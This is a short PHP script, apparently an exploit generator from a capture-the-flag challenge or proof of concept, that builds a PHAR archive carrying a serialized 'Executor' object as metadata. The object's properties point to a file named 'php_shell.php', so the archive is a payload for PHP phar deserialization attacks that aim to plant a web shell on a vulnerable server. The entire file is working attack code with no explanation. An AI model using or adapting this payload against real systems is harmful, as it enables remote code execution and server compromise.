<?php

class Executor{
	private $filename = "php_shell.php";
	private $signature = True;
	private $init = False;
}

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$obj = new Executor();
$phar->setMetadata($obj);
$phar->addFromString("test.txt", "text");
$phar->stopBuffering();

?>